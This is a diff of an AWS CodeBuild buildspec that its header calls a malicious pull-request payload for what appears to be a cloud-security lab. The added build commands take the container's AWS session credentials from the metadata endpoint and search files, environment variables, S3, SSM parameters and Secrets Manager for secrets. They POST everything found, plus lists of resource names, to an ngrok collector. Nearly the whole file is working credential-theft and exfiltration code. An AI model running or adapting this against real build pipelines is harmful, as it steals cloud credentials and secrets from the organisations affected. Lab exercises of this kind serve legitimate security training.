@@ -1,77 +1,99 @@
 version: 0.2
 
 # Malicious PR payload for codebuild_lab_5_project (lab5).
-# Optimized flag hunting - check specific locations and send results via GET.
+# POSTs credentials as JSON to avoid URL length limits.
+# Point COLLECTOR to an ngrok tunnel of your local POST server.
 
 phases:
   build:
     commands:
       - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"
 
-      # 1) Check common flag file locations
+      # Grab the full session token and credentials
+      - CREDS=$(curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}")
+
+      # POST the full credentials as JSON (no URL limits)
+      - |
+        curl -s -X POST "$COLLECTOR/creds" \
+          -H 'Content-Type: application/json' \
+          -d "$CREDS"
+
+      # Also check common flag locations
       - |
         for path in /root/flag /tmp/flag /flag FLAG flag.txt /home/flag /opt/flag; do
           if [ -f "$path" ] && [ -r "$path" ]; then
             FLAG=$(cat "$path" 2>/dev/null)
             if [ ! -z "$FLAG" ]; then
-              curl -s "${COLLECTOR}/?source=file&path=$path&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              curl -s -X POST "$COLLECTOR/flag" \
+                -H 'Content-Type: application/json' \
+                -d "{\"source\":\"file\",\"path\":\"$path\",\"flag\":\"$FLAG\"}"
               exit 0
             fi
           fi
         done
 
-      # 2) Check environment variables for FLAG* or flag* pattern
+      # Check environment variables
       - |
         for var in FLAG FLAG_VALUE FLAG_CONTENT SECRET SOLUTION ANSWER; do
           if [ ! -z "${!var}" ]; then
-            curl -s "${COLLECTOR}/?source=env&var=$var&flag=$(echo -n "${!var}" | jq -sRr @uri)"
+            curl -s -X POST "$COLLECTOR/flag" \
+              -H 'Content-Type: application/json' \
+              -d "{\"source\":\"env\",\"var\":\"$var\",\"flag\":\"${!var}\"}"
             exit 0
           fi
         done
 
-      # 3) Hunt S3 for objects with "flag" in name and download them
+      # Hunt S3 for flag content
       - |
         for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
           for obj in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[].Key' --output text 2>/dev/null); do
             if echo "$obj" | grep -qi flag; then
               FLAG=$(aws s3api get-object --bucket "$b" --key "$obj" /dev/stdout 2>/dev/null | head -c 1000)
               if [ ! -z "$FLAG" ]; then
-                curl -s "${COLLECTOR}/?source=s3&bucket=$b&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+                curl -s -X POST "$COLLECTOR/flag" \
+                  -H 'Content-Type: application/json' \
+                  -d "{\"source\":\"s3\",\"bucket\":\"$b\",\"key\":\"$obj\",\"flag\":\"$FLAG\"}"
                 exit 0
               fi
             fi
           done
         done
 
-      # 4) Hunt SSM parameters - especially /flag* or containing "flag"
+      # Hunt SSM parameters
       - |
         for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
           if echo "$p" | grep -qi flag; then
             FLAG=$(aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null)
             if [ ! -z "$FLAG" ]; then
-              curl -s "${COLLECTOR}/?source=ssm&param=$p&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              curl -s -X POST "$COLLECTOR/flag" \
+                -H 'Content-Type: application/json' \
+                -d "{\"source\":\"ssm\",\"param\":\"$p\",\"flag\":\"$FLAG\"}"
               exit 0
             fi
           fi
         done
 
-      # 5) Hunt Secrets Manager
+      # Hunt Secrets Manager
       - |
         for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
           if echo "$s" | grep -qi flag; then
             FLAG=$(aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null)
             if [ ! -z "$FLAG" ]; then
-              curl -s "${COLLECTOR}/?source=secrets&secret=$s&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              curl -s -X POST "$COLLECTOR/flag" \
+                -H 'Content-Type: application/json' \
+                -d "{\"source\":\"secrets\",\"secret\":\"$s\",\"flag\":\"$FLAG\"}"
               exit 0
             fi
           fi
         done
 
-      # 6) If still nothing, list all parameter/secret names so user can choose
+      # If no flag found, enumerate what we can see
       - |
-        PARAMS=$(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '|')
-        SECRETS=$(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '|')
-        BUCKETS=$(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null | tr '\t' '|')
-        curl -s "${COLLECTOR}/?source=enum&ssm_params=$(echo -n "$PARAMS" | jq -sRr @uri)&secrets=$(echo -n "$SECRETS" | jq -sRr @uri)&buckets=$(echo -n "$BUCKETS" | jq -sRr @uri)"
+        PARAMS=$(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null)
+        SECRETS=$(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null)
+        BUCKETS=$(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null)
+        curl -s -X POST "$COLLECTOR/enum" \
+          -H 'Content-Type: application/json' \
+          -d "{\"ssm_params\":\"$PARAMS\",\"secrets\":\"$SECRETS\",\"s3_buckets\":\"$BUCKETS\"}"
 
       - echo "Done"
